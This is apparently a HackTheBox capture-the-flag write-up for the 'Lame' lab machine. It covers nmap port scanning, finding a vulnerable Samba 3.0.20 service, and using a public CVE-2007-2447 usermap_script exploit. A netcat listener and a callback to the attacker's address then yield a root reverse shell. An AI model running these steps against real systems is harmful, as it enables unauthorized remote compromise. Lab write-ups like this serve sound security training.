# HackTheBox : LAME

Nmap scans

```zsh
nmap -sS -v -p- -r -Pn 10.10.10.3
```
This will give us all of the Open Ports. We can then run a script and version scan on those open parts.

```PORT     STATE SERVICE     VERSION                                                                                                                                          
21/tcp   open  ftp         vsftpd 2.3.4                                                                                                                                     
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                                                                      
| ftp-syst:                                                                                                                                                                 
|   STAT:                                                                                                                                                                   
| FTP server status:                                                                                                                                                        
|      Connected to 10.10.14.4                                                                                                                                              
|      Logged in as ftp                                                                                                                                                     
|      TYPE: ASCII                                                                                                                                                          
|      No session bandwidth limit                                                                                                                                           
|      Session timeout in seconds is 300                                                                                                                                    
|      Control connection is plain text                                                                                                                                     
|      Data connections will be plain text                                                                                                                                  
|      vsFTPd 2.3.4 - secure, fast, stable                                                                                                                                  
|_End of status                                                                                                                                                             
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)               
| ssh-hostkey:                             
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)                        
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)                        
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)            
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))           
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel                        

Host script results:                       
|_clock-skew: mean: -3d00h55m34s, deviation: 2h49m45s, median: -3d02h55m37s           
| smb-os-discovery:                        
|   OS: Unix (Samba 3.0.20-Debian)                                                    
|   Computer name: lame                    
|   NetBIOS computer name:                 
|   Domain name: hackthebox.gr   
|   FQDN: lame.hackthebox.gr               
|_  System time: 2020-05-24T01:33:28-04:00                                            
| smb-security-mode:                       
|   account_used: guest                    
|   authentication_level: user             
|   challenge_response: supported                                                     
|_  message_signing: disabled (dangerous, but default)                                
|_smb2-time: Protocol negotiation failed (SMB2)
 
```

Now on first glance vsftpd appears to be vulnerable, we can try but it won't work. So finally we move our eyes on SMB. The samba version is 3.0.20

```zsh 
searchsploit samba 3.0
```

```Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution```
This stands out to me but this is a metasploit module. So,I try to look for a python version and came across this link.

```https://amriunix.com/post/cve-2007-2447-samba-usermap-script/```
Downloaded the github code and then set up a listener at port 4444 ```rlwrap nc -lvnp 4444```

And finally ran the exploit using :

```python usermap_script.py 10.10.10.3 139 10.10.14.4 4444``` 

Now ! you a reverse shell and with root ! 